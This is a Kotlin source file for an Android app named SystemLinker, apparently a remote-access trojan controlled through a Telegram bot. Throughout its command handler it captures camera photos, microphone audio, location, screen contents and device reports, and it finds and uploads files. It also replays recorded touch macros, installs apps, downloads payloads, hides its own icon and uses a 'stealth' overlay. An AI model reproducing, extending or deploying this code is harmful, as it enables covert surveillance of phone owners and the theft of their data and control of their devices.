package com.systemlinker.features.workflow

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import com.systemlinker.base.ConfigStore
import com.systemlinker.base.ErrorLogger
import com.systemlinker.base.VaultManager
import com.systemlinker.features.HelpGenerator
import com.systemlinker.features.LiveSessionManager
import com.systemlinker.features.MediaHandler
import com.systemlinker.features.SystemHandler
import com.systemlinker.features.TelegramUploader
import com.systemlinker.features.call.VoipManager
import com.systemlinker.features.events.TriggerManager
import kotlinx.coroutines.delay
import kotlinx.coroutines.suspendCancellableCoroutine
import org.json.JSONObject
import java.io.File
import kotlin.coroutines.resume

class SystemModule(
    private val context: Context,
    private val systemHandler: SystemHandler,
    private val mediaHandler: MediaHandler,
    private val uploader: TelegramUploader
) {
    suspend fun execute(task: CmdTask, wfContext: WorkflowContext): Boolean {
        val resolvedArg = wfContext.resolve(task.arg)
        wfContext.log("Command: ${task.cmd} $resolvedArg")
        
        val configStore = ConfigStore(context)
        val vaultManager = VaultManager(context)
        val triggerManager = TriggerManager(context, vaultManager)
        val liveSessionManager = LiveSessionManager(context)
        val voipManager = VoipManager(context)
        val engine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)

        when (task.cmd) {
            "send" -> {
                val targetFile = resolvedArg.trim()
                wfContext.log("Scouring internal storage and assets for: $targetFile ...")
                val foundFile = systemHandler.searchAndExtractFile(targetFile)

                if (foundFile != null && foundFile.exists()) {
                    val isTemp = foundFile.absolutePath.contains("extracted_asset")
                    uploader.sendDocument(foundFile, "WF Export: ${foundFile.name}", deleteAfter = isTemp)
                    wfContext.log("File extracted and uploaded successfully: ${foundFile.name}")
                } else {
                    wfContext.log("File extraction failed. Could not locate: $targetFile")
                    return false
                }
            }
            "track_activity" -> {
                val parts = resolvedArg.split(",").map { it.trim() }
                val duration = parts.getOrNull(0)?.toLongOrNull() ?: 10L
                val taskName = parts.getOrNull(1) ?: ""

                wfContext.log("Macro Activity Tracking started for $duration seconds...")
                val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                    setPackage(context.packageName)
                    putExtra("action", "start_macro_track")
                }
                context.sendBroadcast(intent)

                delay(duration * 1000L)

                val trackFile = suspendCancellableCoroutine<File?> { cont ->
                    val receiver = object : BroadcastReceiver() {
                        override fun onReceive(c: Context?, intent: Intent?) {
                            if (intent?.action == "com.systemlinker.MACRO_RESULT") {
                                context.unregisterReceiver(this)
                                val path = intent.getStringExtra("path")
                                if (path != null) cont.resume(File(path)) else cont.resume(null)
                            }
                        }
                    }
                    val filter = IntentFilter("com.systemlinker.MACRO_RESULT")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                    } else {
                        context.registerReceiver(receiver, filter)
                    }

                    val stopIntent = Intent("com.systemlinker.ACC_ACTION").apply {
                        setPackage(context.packageName)
                        putExtra("action", "stop_macro_track")
                    }
                    context.sendBroadcast(stopIntent)
                }

                if (trackFile != null && trackFile.exists()) {
                    if (taskName.isNotEmpty()) {
                        vaultManager.saveWorkflow(taskName, "macro", "", trackFile.readText())
                        wfContext.log("Tracking saved to DB as: $taskName")
                    }
                    uploader.sendDocument(trackFile, "WF Macro Track: ${taskName.ifEmpty { "Temp Session" }}", deleteAfter = true)
                } else {
                    wfContext.log("Tracking failed to generate log.")
                    return false
                }
            }

            "perform" -> {
                val parts = resolvedArg.split(",").map { it.trim() }
                val lag = parts.getOrNull(0)?.toLongOrNull() ?: 0L
                val loops = parts.getOrNull(1)?.toIntOrNull() ?: 1
                val taskName = parts.getOrNull(2) ?: ""

                var macroContent = if (taskName.isNotEmpty()) vaultManager.getWorkflow(taskName) else null

                if (macroContent == null) {
                    wfContext.log("Polling for 30s for Macro Track file...")
                    val destFile = File(context.cacheDir, "temp_macro.txt")
                    val success = uploader.pollForFile(30, "document", destFile)
                    if (success) {
                        macroContent = destFile.readText()
                        if (taskName.isNotEmpty()) {
                            vaultManager.saveWorkflow(taskName, "macro", "", macroContent)
                            wfContext.log("Received macro saved permanently to DB as: $taskName")
                        }
                        destFile.delete()
                    } else {
                        wfContext.log("Timeout. No macro file received.")
                        return false
                    }
                }

                if (macroContent != null) {
                    if (lag > 0) {
                        wfContext.log("Lag interval: Waiting $lag seconds before execution...")
                        delay(lag * 1000L)
                    }
                    wfContext.log("Executing macro: ${taskName.ifEmpty { "Polled File" }} (Loops: $loops)")
                    val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                        setPackage(context.packageName)
                        putExtra("action", "play_macro")
                        putExtra("macro_content", macroContent)
                        putExtra("loops", loops)
                    }
                    context.sendBroadcast(intent)
                }
            }

            "call" -> {
                val parts = resolvedArg.split(",").map { it.trim() }
                if (parts.size >= 2) {
                    val mode = parts[0]
                    val speaker = parts[1]
                    var url = if (parts.size >= 3) parts[2] else ""
                    
                    if (url.isEmpty()) {
                        uploader.sendText("⏳ Polling for 30s. Please send the WebSocket URL (ws:// or wss://)...")
                        val receivedText = uploader.pollForText(30)
                        
                        if (receivedText != null && receivedText.startsWith("ws")) {
                            url = receivedText
                        } else {
                            wfContext.log("Timeout or invalid URL received. Call aborted.")
                            return false
                        }
                    }
                    
                    if (url.startsWith("ws")) {
                        if (!url.endsWith("/live")) {
                            url = url.removeSuffix("/") + "/live"
                        }
                        voipManager.startCall(url, mode, speaker)
                        wfContext.log("VoIP Call Started. Mode: $mode, Speaker: $speaker, Target: $url")
                    } else {
                        wfContext.log("Invalid URL format. Must start with ws:// or wss://")
                        return false
                    }
                } else {
                    wfContext.log("Invalid call args. Expected: mode, speaker_mode")
                    return false
                }
            }
            "end_call" -> {
                if (voipManager.isCallActive) {
                    voipManager.endCall()
                    wfContext.log("VoIP Call Terminated.")
                } else {
                    wfContext.log("No active call to terminate.")
                }
            }
            "help" -> {
                val type = resolvedArg.trim().lowercase()
                if (type == "workflow") {
                    val docFile = HelpGenerator.generateWorkflowHelp(context)
                    uploader.sendDocument(docFile, "📚 System Linker - Workflow Engine Guide", true)
                    wfContext.log("Workflow help sent.")
                } else {
                    val docFile = HelpGenerator.generateCommandHelp(context)
                    uploader.sendDocument(docFile, "🛠️ System Linker - Command Reference Guide", true)
                    wfContext.log("Command help sent.")
                }
            }
            "set_bot_api" -> {
                configStore.botToken = resolvedArg.trim()
                uploader.botToken = configStore.botToken
                wfContext.log("Bot API updated permanently.")
            }
            "set_target_chatid" -> {
                configStore.targetChatId = resolvedArg.trim().toLongOrNull() ?: configStore.targetChatId
                uploader.chatId = configStore.targetChatId
                wfContext.log("Target Chat ID updated permanently.")
            }
            "set_overlay_duration" -> {
                configStore.overlayDurationMs = resolvedArg.trim().toLongOrNull() ?: 3000L
                wfContext.log("Overlay duration set to ${configStore.overlayDurationMs}ms.")
            }
            "click_after_HS_switch" -> {
                val parts = resolvedArg.split(",")
                if (parts.isNotEmpty()) {
                    configStore.postHotspotAction = parts[0].trim()
                    configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
                    wfContext.log("Post-Hotspot action set to: ${configStore.postHotspotAction} x${configStore.postHotspotArgs}")
                }
            }
            "set_overlay" -> {
                wfContext.log("Polling for 30s for overlay image...")
                val destFile = File(context.filesDir, "stealth_overlay.jpg")
                val success = uploader.pollForFile(30, "photo", destFile)
                if (success) wfContext.log("Overlay image received and saved successfully.")
                else wfContext.log("Timeout. No image received.")
            }
            "halt_workflow" -> {
                val target = resolvedArg.trim().ifBlank { "all" }
                vaultManager.setWorkflowState(target, "halted")
                triggerManager.refreshTriggers()
                wfContext.log("Workflow(s) [$target] HALTED. Triggers optimized.")
            }
            "resume_workflow" -> {
                val target = resolvedArg.trim().ifBlank { "all" }
                vaultManager.setWorkflowState(target, "active")
                triggerManager.refreshTriggers()
                wfContext.log("Workflow(s) [$target] RESUMED. Required triggers activated.")
            }
            "workflow" -> {
                val wfName = resolvedArg.trim().ifBlank { "default_flow" }
                wfContext.log("Polling for 30s. Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
                val destFile = File(context.cacheDir, "$wfName.yml")
                val success = uploader.pollForFile(30, "document", destFile)
                
                if (success) {
                    val content = destFile.readText()
                    destFile.delete() 
                    
                    val tasks = WorkflowParser.parseString(content)
                    val meta = tasks.firstOrNull { it.type == "meta" } as? MetaTask
                    
                    val type = meta?.lifecycle ?: "temp"
                    val trigger = meta?.trigger ?: ""
                    
                    vaultManager.saveWorkflow(wfName, type, trigger, content)
                    triggerManager.refreshTriggers()
                    
                    if (type == "temp") {
                        wfContext.log("Temp Workflow saved. Executing & Deleting...")
                        engine.executeWorkflow(wfName, deleteAfter = true)
                    } else if (type == "semi" || type == "semi_perma") {
                        wfContext.log("Semi-Perma Workflow active. Listening for trigger: $trigger")
                    } else {
                        wfContext.log("Permanent Workflow saved. Ready for manual execution.")
                        engine.executeWorkflow(wfName, deleteAfter = false)
                    }
                } else {
                    wfContext.log("Timeout. No workflow document received.")
                }
            }
            "status_workflow" -> {
                val wfName = resolvedArg.trim().ifBlank { "default_flow" }
                engine.sendStatus(wfName)
                wfContext.log("Workflow status requested for $wfName")
            }
            "dump_screen" -> {
                wfContext.log("Extracting UI DOM Tree...")
                val dumpFile = suspendCancellableCoroutine<File?> { cont ->
                    val receiver = object : BroadcastReceiver() {
                        override fun onReceive(c: Context?, intent: Intent?) {
                            if (intent?.action == "com.systemlinker.UI_RESULT") {
                                context.unregisterReceiver(this)
                                val msg = intent.getStringExtra("result") ?: ""
                                if (msg.contains("SUCCESS")) {
                                    if (cont.isActive) cont.resume(File(context.filesDir, "ui_debug_dump.txt"))
                                } else {
                                    if (cont.isActive) cont.resume(null)
                                }
                            }
                        }
                    }
                    val filter = IntentFilter("com.systemlinker.UI_RESULT")
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
                    } else {
                        context.registerReceiver(receiver, filter)
                    }
                    val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                        setPackage(context.packageName)
                        putExtra("action", "dump_screen_request")
                    }
                    context.sendBroadcast(intent)
                }
                
                if (dumpFile != null && dumpFile.exists()) {
                    uploader.sendDocument(dumpFile, "Workflow UI Debug Dump", true)
                    wfContext.log("Screen dump generated and sent.")
                } else {
                    wfContext.log("Failed to generate UI dump.")
                    return false
                }
            }
            "ping" -> wfContext.log("🟢 Device Online\n${systemHandler.getBasicBatteryStatus()}")
            "cam_front" -> mediaHandler.takePicture(isFront = true)?.let { 
                uploader.sendFile(it, "photo", "WF Front Camera")
                wfContext.log("Front camera captured.")
            }
            "cam_back" -> mediaHandler.takePicture(isFront = false)?.let { 
                uploader.sendFile(it, "photo", "WF Back Camera")
                wfContext.log("Back camera captured.")
            }
            "mic" -> mediaHandler.recordAudio(resolvedArg.toIntOrNull() ?: 15)?.let { 
                uploader.sendFile(it, "audio", "WF Mic Record")
                wfContext.log("Mic recording completed.")
            }
            "loc" -> wfContext.log(systemHandler.getLocation())
            "flash" -> wfContext.log(systemHandler.setFlashlight(resolvedArg == "on"))
            "vol" -> {
                systemHandler.setVolume(resolvedArg.toIntOrNull() ?: 50)
                wfContext.log("Volume set to $resolvedArg")
            }
            "info" -> {
                val report = systemHandler.generateFullSystemReport()
                uploader.sendDocument(report, "Full Device Intel Report", true)
                wfContext.log("Intel report generated and sent.")
            }
            "get_log" -> {
                val logFile = ErrorLogger.getLogFile(context)
                uploader.sendDocument(logFile, "SystemLinker Error Logs")
                wfContext.log("Error logs extracted.")
            }
            "clear_log" -> {
                ErrorLogger.clearLogs(context)
                wfContext.log("Error logs cleared.")
            }
            "live_start" -> {
                liveSessionManager.connect(resolvedArg.trim())
                wfContext.log("Live session started.")
            }
            "live_stop" -> {
                liveSessionManager.disconnect()
                wfContext.log("Live session stopped.")
            }
            "install_app" -> {
                systemHandler.installApp(resolvedArg)
                wfContext.log("App installation triggered for $resolvedArg")
            }
            "uninstall_app" -> {
                systemHandler.uninstallApp(resolvedArg)
                wfContext.log("App uninstallation triggered for $resolvedArg")
            }
            "icon_hide" -> wfContext.log(systemHandler.setAppIconVisibility(false))
            "icon_show" -> wfContext.log(systemHandler.setAppIconVisibility(true))
            "toggle_wifi" -> wfContext.log(systemHandler.setWifiState(resolvedArg == "on"))
            "toggle_bt" -> wfContext.log(systemHandler.setBluetoothState(resolvedArg == "on"))
            "toggle_hotspot" -> wfContext.log(systemHandler.setHotspotState(resolvedArg == "on"))
            "scan_wifi" -> wfContext.log(systemHandler.getWifiScanResults())
            "scan_bt" -> wfContext.log(systemHandler.getBluetoothScanResults())
            "download_url" -> {
                try {
                    val json = JSONObject(resolvedArg)
                    wfContext.log(systemHandler.downloadFileFromUrl(json.optString("url"), json.optString("path", "")))
                } catch (e: Exception) { 
                    wfContext.log("Failed to parse JSON for download_url: ${e.message}")
                }
            }
            else -> {
                wfContext.log("Unknown command: ${task.cmd}")
                return false
            }
        }
        return true
    }
}

class UiModule(private val context: Context) {
    suspend fun execute(task: UiTask, wfContext: WorkflowContext): Boolean {
        val resolvedTexts = wfContext.resolve(task.texts)
        val resolvedInput = wfContext.resolve(task.inputText)
        wfContext.log("UI: ${task.action} on ${task.target} near [$resolvedTexts]")

        val result = suspendCancellableCoroutine<String> { continuation ->
            val receiver = object : BroadcastReceiver() {
                override fun onReceive(c: Context?, intent: Intent?) {
                    if (intent?.action == "com.systemlinker.UI_RESULT") {
                        context.unregisterReceiver(this)
                        continuation.resume(intent.getStringExtra("result") ?: "FAILED: Unknown")
                    }
                }
            }
            val filter = IntentFilter("com.systemlinker.UI_RESULT")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                context.registerReceiver(receiver, filter)
            }

            val intent = Intent("com.systemlinker.ACC_ACTION").apply {
                setPackage(context.packageName)
                putExtra("action", "workflow_ui")
                putExtra("ui_texts", resolvedTexts)
                putExtra("ui_target", task.target)
                putExtra("ui_action", task.action)
                putExtra("ui_offset", task.offset)
                putExtra("ui_case_sensitive", task.caseSensitive)
                putExtra("ui_input_text", resolvedInput) 
                putExtra("ui_extract", task.extractToVar.isNotEmpty()) 
                putExtra("ui_swipe_sx", task.startX); putExtra("ui_swipe_sy", task.startY)
                putExtra("ui_swipe_ex", task.endX); putExtra("ui_swipe_ey", task.endY)
            }
            context.sendBroadcast(intent)
        }

        wfContext.log("UI Result: $result")

        if (task.extractToVar.isNotEmpty() && result.startsWith("EXTRACTED:")) {
            val extractedText = result.substringAfter("EXTRACTED:").trim()
            wfContext.variables[task.extractToVar] = extractedText
            wfContext.log("Variable ${task.extractToVar} saved: $extractedText")
            return true
        }
        
        return result.startsWith("SUCCESS")
    }
}